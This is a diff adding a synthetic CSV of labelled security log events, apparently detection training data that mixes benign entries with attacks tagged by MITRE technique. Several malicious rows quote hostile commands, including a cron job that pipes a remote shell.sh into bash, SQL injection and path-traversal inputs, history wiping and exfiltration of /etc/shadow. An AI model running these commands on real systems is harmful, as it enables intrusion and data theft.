@@ -1,0 +1,401 @@
+timestamp,source_ip,user,process,event_type,severity,description,mitre_technique,attack_type,is_malicious
+2023-10-14 08:01:26,185.220.101.5,unknown,auditd,FILE_ACCESS,CRITICAL,File access denied: /etc/shadow access attempt by user 'www-data',T1003.008,Credential_Access,1
+2023-10-14 08:01:48,127.0.0.1,svc_backup,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 08:02:47,185.220.101.5,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 185.220.101.5,T1190,SQL_Injection,1
+2023-10-14 08:03:56,127.0.0.1,jdoe,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 08:04:58,192.168.1.15,root,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 08:05:23,192.168.1.45,asmith,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 08:06:11,104.22.15.9,unknown,systemd,DEFENSE_EVASION,CRITICAL,Auditd logging daemon stopped by UID 0,T1562.001,Defense_Evasion,1
+2023-10-14 08:08:04,192.168.1.15,root,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'root' by (uid=0),T0000,Benign,0
+2023-10-14 08:09:17,104.22.15.9,unknown,systemd,DEFENSE_EVASION,CRITICAL,Auditd logging daemon stopped by UID 0,T1562.001,Defense_Evasion,1
+2023-10-14 08:11:08,127.0.0.1,asmith,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 08:11:21,45.154.255.88,unknown,kernel,AUDIT,CRITICAL,Privilege escalation: UID 1001 modified SUID bit on /bin/bash,T1548.001,Privilege_Escalation,1
+2023-10-14 08:13:15,194.26.29.112,root,sshd,AUTH,WARNING,Failed password for root from 194.26.29.112 port 48217 ssh2,T1110.001,Brute_Force,1
+2023-10-14 08:14:18,192.168.1.102,jdoe,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 08:15:48,185.220.101.5,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 185.220.101.5,T1190,SQL_Injection,1
+2023-10-14 08:16:13,127.0.0.1,svc_backup,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'svc_backup' by (uid=0),T0000,Benign,0
+2023-10-14 08:16:59,192.168.1.45,admin,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 08:18:47,192.168.1.45,admin,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'admin' by (uid=0),T0000,Benign,0
+2023-10-14 08:20:23,10.0.0.12,bkumar,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 08:20:46,45.154.255.88,unknown,kernel,AUDIT,CRITICAL,Privilege escalation: UID 1001 modified SUID bit on /bin/bash,T1548.001,Privilege_Escalation,1
+2023-10-14 08:22:45,192.168.1.45,jdoe,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 08:23:01,192.168.1.45,admin,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 08:24:47,10.0.0.12,admin,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 08:25:51,192.168.1.15,root,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 08:26:10,192.168.1.102,root,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 08:26:58,185.220.101.5,root,bash,DEFENSE_EVASION,CRITICAL,Command history cleared: rm -f /root/.bash_history,T1070.003,Defense_Evasion,1
+2023-10-14 08:27:03,127.0.0.1,asmith,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 08:28:12,192.168.1.102,svc_backup,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 08:29:21,192.168.1.45,asmith,sshd,AUTH,INFO,Accepted publickey for user 'asmith' from 192.168.1.45 port 43892 ssh2,T0000,Benign,0
+2023-10-14 08:30:33,10.0.0.12,asmith,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 08:31:24,192.168.1.102,root,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 08:31:59,10.0.0.12,admin,systemd,DAEMON,INFO,Service 'rsyslog' reloaded configuration.,T0000,Benign,0
+2023-10-14 08:33:41,10.0.0.12,jdoe,sshd,AUTH,INFO,Accepted publickey for user 'jdoe' from 10.0.0.12 port 43892 ssh2,T0000,Benign,0
+2023-10-14 08:34:19,192.168.1.45,bkumar,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 08:35:57,10.0.0.12,asmith,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 08:36:49,192.168.1.15,bkumar,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 08:37:02,192.168.1.45,developer,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 08:37:07,185.220.101.5,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 185.220.101.5,T1190,Path_Traversal,1
+2023-10-14 08:39:07,104.22.15.9,root,crontab,AUDIT,CRITICAL,New cron job added for user root: '* * * * * curl http://104.22.15.9/shell.sh | bash',T1053.003,Persistence,1
+2023-10-14 08:39:42,185.220.101.5,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 08:41:19,10.0.0.12,developer,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 08:42:24,192.168.1.15,admin,systemd-logind,AUTH,INFO,New session c541 of user 'admin'.,T0000,Benign,0
+2023-10-14 08:43:14,192.168.1.15,root,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 08:44:41,45.154.255.88,unknown,systemd,DEFENSE_EVASION,CRITICAL,Auditd logging daemon stopped by UID 0,T1562.001,Defense_Evasion,1
+2023-10-14 08:45:17,194.26.29.112,unknown,kernel,SYSTEM,CRITICAL,Shadow copies deletion / system recovery disabled: vssadmin delete shadows,T1490,Inhibit_System_Recovery,1
+2023-10-14 08:46:16,185.220.101.5,unknown,curl,NETWORK,CRITICAL,"High volume outbound data transfer to 185.220.101.5:4444 (Payload: /etc/shadow, /var/db)",T1048,Exfiltration,1
+2023-10-14 08:47:17,192.168.1.15,developer,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 08:48:31,192.168.1.45,root,systemd,DAEMON,INFO,Service 'nginx' reloaded configuration.,T0000,Benign,0
+2023-10-14 08:49:38,192.168.1.15,bkumar,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 08:49:43,10.0.0.12,root,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'root' by (uid=0),T0000,Benign,0
+2023-10-14 08:51:17,10.0.0.12,developer,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 08:51:59,104.22.15.9,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 104.22.15.9,T1190,Path_Traversal,1
+2023-10-14 08:52:11,185.220.101.5,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 08:53:21,104.22.15.9,root,sshd,AUTH,CRITICAL,Accepted password for root from 104.22.15.9 port 34453 ssh2 (Compromised account),T1078,Unauthorized_Access,1
+2023-10-14 08:54:52,127.0.0.1,admin,postgres,DATABASE,INFO,Database connection established from 127.0.0.1:5432,T0000,Benign,0
+2023-10-14 08:56:13,194.26.29.112,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 194.26.29.112,T1190,SQL_Injection,1
+2023-10-14 08:56:58,192.168.1.102,svc_backup,systemd-logind,AUTH,INFO,New session c371 of user 'svc_backup'.,T0000,Benign,0
+2023-10-14 08:57:53,194.26.29.112,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 08:59:34,127.0.0.1,bkumar,systemd,DAEMON,INFO,Service 'sshd' started successfully.,T0000,Benign,0
+2023-10-14 08:59:48,192.168.1.45,asmith,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 09:01:45,185.220.101.5,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 09:03:36,127.0.0.1,developer,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'developer' by (uid=0),T0000,Benign,0
+2023-10-14 09:05:25,192.168.1.45,admin,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 09:07:23,185.220.101.5,unknown,kernel,SYSTEM,CRITICAL,Shadow copies deletion / system recovery disabled: vssadmin delete shadows,T1490,Inhibit_System_Recovery,1
+2023-10-14 09:08:04,192.168.1.45,asmith,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 09:09:58,45.154.255.88,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 09:10:14,192.168.1.15,asmith,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 09:11:57,185.220.101.5,unknown,auditd,FILE_ACCESS,CRITICAL,File access denied: /etc/shadow access attempt by user 'www-data',T1003.008,Credential_Access,1
+2023-10-14 09:13:12,192.168.1.15,admin,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 09:15:12,45.154.255.88,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 45.154.255.88,T1190,Path_Traversal,1
+2023-10-14 09:16:12,45.154.255.88,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 09:18:12,192.168.1.15,jdoe,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 09:19:28,192.168.1.45,developer,postgres,DATABASE,INFO,Database connection established from 192.168.1.45:5432,T0000,Benign,0
+2023-10-14 09:19:53,10.0.0.12,jdoe,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 09:21:32,192.168.1.45,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 09:23:17,192.168.1.15,root,postgres,DATABASE,INFO,Database connection established from 192.168.1.15:5432,T0000,Benign,0
+2023-10-14 09:23:50,45.154.255.88,unknown,curl,NETWORK,CRITICAL,"High volume outbound data transfer to 45.154.255.88:4444 (Payload: /etc/shadow, /var/db)",T1048,Exfiltration,1
+2023-10-14 09:25:40,192.168.1.15,jdoe,systemd-logind,AUTH,INFO,New session c297 of user 'jdoe'.,T0000,Benign,0
+2023-10-14 09:26:36,192.168.1.102,admin,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 09:27:46,192.168.1.102,developer,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 09:29:43,192.168.1.102,developer,sshd,AUTH,INFO,Accepted publickey for user 'developer' from 192.168.1.102 port 43892 ssh2,T0000,Benign,0
+2023-10-14 09:31:04,192.168.1.102,root,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 09:32:14,185.220.101.5,unknown,systemd,SYSTEM,CRITICAL,SYSTEM SHUTDOWN INITIATED by UID 0 (Anti-forensics evasion),T1529,Anti_Forensics,1
+2023-10-14 09:32:24,127.0.0.1,developer,systemd,DAEMON,INFO,Service 'ufw' started successfully.,T0000,Benign,0
+2023-10-14 09:34:03,10.0.0.12,asmith,systemd-logind,AUTH,INFO,New session c780 of user 'asmith'.,T0000,Benign,0
+2023-10-14 09:34:50,192.168.1.15,root,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 09:35:59,10.0.0.12,asmith,postgres,DATABASE,INFO,Database connection established from 10.0.0.12:5432,T0000,Benign,0
+2023-10-14 09:37:14,194.26.29.112,root,bash,DEFENSE_EVASION,CRITICAL,Command history cleared: rm -f /root/.bash_history,T1070.003,Defense_Evasion,1
+2023-10-14 09:38:37,192.168.1.15,developer,postgres,DATABASE,INFO,Database connection established from 192.168.1.15:5432,T0000,Benign,0
+2023-10-14 09:39:08,192.168.1.102,developer,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 09:40:09,192.168.1.45,bkumar,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 09:40:50,192.168.1.102,developer,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 09:42:31,185.220.101.5,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 09:42:54,194.26.29.112,unknown,kernel,AUDIT,CRITICAL,Privilege escalation: UID 1001 modified SUID bit on /bin/bash,T1548.001,Privilege_Escalation,1
+2023-10-14 09:43:57,192.168.1.45,developer,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 09:44:51,192.168.1.15,jdoe,systemd-logind,AUTH,INFO,New session c981 of user 'jdoe'.,T0000,Benign,0
+2023-10-14 09:46:34,192.168.1.45,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 09:48:08,192.168.1.45,developer,systemd,DAEMON,INFO,Service 'rsyslog' started successfully.,T0000,Benign,0
+2023-10-14 09:49:11,45.154.255.88,unknown,curl,NETWORK,CRITICAL,"High volume outbound data transfer to 45.154.255.88:4444 (Payload: /etc/shadow, /var/db)",T1048,Exfiltration,1
+2023-10-14 09:50:34,127.0.0.1,bkumar,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 09:52:14,192.168.1.45,asmith,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 09:52:54,192.168.1.45,bkumar,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 09:53:08,192.168.1.102,asmith,systemd-logind,AUTH,INFO,New session c653 of user 'asmith'.,T0000,Benign,0
+2023-10-14 09:53:23,194.26.29.112,unknown,kernel,AUDIT,CRITICAL,Privilege escalation: UID 1001 modified SUID bit on /bin/bash,T1548.001,Privilege_Escalation,1
+2023-10-14 09:54:58,194.26.29.112,root,bash,DEFENSE_EVASION,CRITICAL,Command history cleared: rm -f /root/.bash_history,T1070.003,Defense_Evasion,1
+2023-10-14 09:56:12,10.0.0.12,jdoe,systemd,DAEMON,INFO,Service 'cron' started successfully.,T0000,Benign,0
+2023-10-14 09:57:31,127.0.0.1,root,systemd,DAEMON,INFO,Service 'cron' started successfully.,T0000,Benign,0
+2023-10-14 09:57:36,10.0.0.12,root,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'root' by (uid=0),T0000,Benign,0
+2023-10-14 09:58:34,127.0.0.1,developer,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 09:59:07,104.22.15.9,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 09:59:55,192.168.1.45,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 10:00:16,10.0.0.12,admin,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 10:01:45,185.220.101.5,root,bash,DEFENSE_EVASION,CRITICAL,Command history cleared: rm -f /root/.bash_history,T1070.003,Defense_Evasion,1
+2023-10-14 10:02:13,45.154.255.88,unknown,systemd,DEFENSE_EVASION,CRITICAL,Auditd logging daemon stopped by UID 0,T1562.001,Defense_Evasion,1
+2023-10-14 10:03:16,192.168.1.102,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 10:04:14,194.26.29.112,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 194.26.29.112,T1190,SQL_Injection,1
+2023-10-14 10:05:54,192.168.1.15,jdoe,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 10:06:04,192.168.1.15,jdoe,systemd-logind,AUTH,INFO,New session c256 of user 'jdoe'.,T0000,Benign,0
+2023-10-14 10:06:39,185.220.101.5,root,sshd,AUTH,WARNING,Failed password for root from 185.220.101.5 port 60476 ssh2,T1110.001,Brute_Force,1
+2023-10-14 10:08:13,185.220.101.5,root,sshd,FILE_ACCESS,CRITICAL,File /root/.ssh/authorized_keys modified by remote session,T1098.004,Persistence,1
+2023-10-14 10:09:57,127.0.0.1,admin,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'admin' by (uid=0),T0000,Benign,0
+2023-10-14 10:11:15,192.168.1.45,bkumar,postgres,DATABASE,INFO,Database connection established from 192.168.1.45:5432,T0000,Benign,0
+2023-10-14 10:12:48,192.168.1.102,admin,systemd-logind,AUTH,INFO,New session c800 of user 'admin'.,T0000,Benign,0
+2023-10-14 10:14:09,192.168.1.15,developer,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 10:15:08,192.168.1.102,developer,systemd,DAEMON,INFO,Service 'authd' reloaded configuration.,T0000,Benign,0
+2023-10-14 10:16:06,192.168.1.102,bkumar,systemd,DAEMON,INFO,Service 'ufw' reloaded configuration.,T0000,Benign,0
+2023-10-14 10:17:09,127.0.0.1,jdoe,postgres,DATABASE,INFO,Database connection established from 127.0.0.1:5432,T0000,Benign,0
+2023-10-14 10:18:32,10.0.0.12,root,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 10:20:22,192.168.1.45,asmith,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'asmith' by (uid=0),T0000,Benign,0
+2023-10-14 10:21:02,10.0.0.12,root,systemd-logind,AUTH,INFO,New session c724 of user 'root'.,T0000,Benign,0
+2023-10-14 10:22:32,192.168.1.102,bkumar,systemd,DAEMON,INFO,Service 'nginx' started successfully.,T0000,Benign,0
+2023-10-14 10:23:04,192.168.1.102,asmith,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'asmith' by (uid=0),T0000,Benign,0
+2023-10-14 10:25:01,185.220.101.5,unknown,iptables,NETWORK,WARNING,"Inbound port scan detected from 185.220.101.5: 22, 80, 443, 3389, 8080",T1046,Port_Scanning,1
+2023-10-14 10:25:36,192.168.1.45,developer,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 10:27:03,192.168.1.15,root,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 10:27:36,127.0.0.1,asmith,systemd-logind,AUTH,INFO,New session c584 of user 'asmith'.,T0000,Benign,0
+2023-10-14 10:28:51,127.0.0.1,svc_backup,postgres,DATABASE,INFO,Database connection established from 127.0.0.1:5432,T0000,Benign,0
+2023-10-14 10:30:25,192.168.1.45,asmith,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'asmith' by (uid=0),T0000,Benign,0
+2023-10-14 10:30:54,192.168.1.45,developer,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 10:32:33,127.0.0.1,developer,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 10:32:50,192.168.1.102,jdoe,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'jdoe' by (uid=0),T0000,Benign,0
+2023-10-14 10:32:56,192.168.1.15,asmith,sshd,AUTH,INFO,Accepted publickey for user 'asmith' from 192.168.1.15 port 43892 ssh2,T0000,Benign,0
+2023-10-14 10:33:38,10.0.0.12,svc_backup,sshd,AUTH,INFO,Accepted publickey for user 'svc_backup' from 10.0.0.12 port 43892 ssh2,T0000,Benign,0
+2023-10-14 10:33:44,10.0.0.12,bkumar,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 10:33:55,104.22.15.9,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 10:34:51,192.168.1.15,svc_backup,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 10:36:39,192.168.1.45,admin,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'admin' by (uid=0),T0000,Benign,0
+2023-10-14 10:38:21,127.0.0.1,root,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 10:39:32,127.0.0.1,asmith,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 10:40:49,192.168.1.15,svc_backup,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 10:42:14,185.220.101.5,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 185.220.101.5,T1190,SQL_Injection,1
+2023-10-14 10:42:41,10.0.0.12,admin,sshd,AUTH,INFO,Accepted publickey for user 'admin' from 10.0.0.12 port 43892 ssh2,T0000,Benign,0
+2023-10-14 10:44:02,192.168.1.102,jdoe,systemd,DAEMON,INFO,Service 'ufw' started successfully.,T0000,Benign,0
+2023-10-14 10:45:36,192.168.1.45,svc_backup,systemd,DAEMON,INFO,Service 'postgresql' reloaded configuration.,T0000,Benign,0
+2023-10-14 10:47:22,192.168.1.45,root,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 10:48:36,45.154.255.88,unknown,sshd,AUTH,WARNING,Failed password for invalid user 'oracle' from 45.154.255.88 port 39321 ssh2,T1110.001,Brute_Force,1
+2023-10-14 10:48:50,45.154.255.88,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 10:49:10,10.0.0.12,svc_backup,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'svc_backup' by (uid=0),T0000,Benign,0
+2023-10-14 10:50:24,192.168.1.15,developer,systemd,DAEMON,INFO,Service 'cron' reloaded configuration.,T0000,Benign,0
+2023-10-14 10:51:10,192.168.1.45,admin,systemd,DAEMON,INFO,Service 'ufw' started successfully.,T0000,Benign,0
+2023-10-14 10:53:05,192.168.1.102,root,systemd,DAEMON,INFO,Service 'sshd' started successfully.,T0000,Benign,0
+2023-10-14 10:54:47,10.0.0.12,developer,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 10:56:06,192.168.1.15,bkumar,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 10:57:03,192.168.1.45,admin,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 10:58:36,127.0.0.1,bkumar,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 10:58:52,10.0.0.12,admin,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 11:00:42,127.0.0.1,root,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 11:00:53,194.26.29.112,root,sshd,FILE_ACCESS,CRITICAL,File /root/.ssh/authorized_keys modified by remote session,T1098.004,Persistence,1
+2023-10-14 11:02:35,185.220.101.5,unknown,auditd,FILE_ACCESS,CRITICAL,File access denied: /etc/shadow access attempt by user 'www-data',T1003.008,Credential_Access,1
+2023-10-14 11:03:36,192.168.1.15,admin,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 11:05:23,45.154.255.88,root,sshd,AUTH,CRITICAL,Accepted password for root from 45.154.255.88 port 30896 ssh2 (Compromised account),T1078,Unauthorized_Access,1
+2023-10-14 11:06:38,192.168.1.15,root,systemd-logind,AUTH,INFO,New session c220 of user 'root'.,T0000,Benign,0
+2023-10-14 11:08:05,192.168.1.102,svc_backup,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 11:08:44,192.168.1.45,bkumar,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 11:09:07,192.168.1.45,developer,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 11:09:47,192.168.1.102,bkumar,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 11:10:26,192.168.1.102,svc_backup,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'svc_backup' by (uid=0),T0000,Benign,0
+2023-10-14 11:11:45,192.168.1.45,root,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 11:12:51,127.0.0.1,root,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 11:13:37,127.0.0.1,jdoe,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 11:15:31,10.0.0.12,asmith,systemd,DAEMON,INFO,Service 'ufw' started successfully.,T0000,Benign,0
+2023-10-14 11:16:24,192.168.1.45,root,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 11:16:45,192.168.1.15,asmith,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 11:17:46,104.22.15.9,unknown,curl,NETWORK,CRITICAL,"High volume outbound data transfer to 104.22.15.9:4444 (Payload: /etc/shadow, /var/db)",T1048,Exfiltration,1
+2023-10-14 11:18:43,10.0.0.12,admin,sshd,AUTH,INFO,Accepted publickey for user 'admin' from 10.0.0.12 port 43892 ssh2,T0000,Benign,0
+2023-10-14 11:19:31,192.168.1.15,svc_backup,postgres,DATABASE,INFO,Database connection established from 192.168.1.15:5432,T0000,Benign,0
+2023-10-14 11:21:25,192.168.1.102,bkumar,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
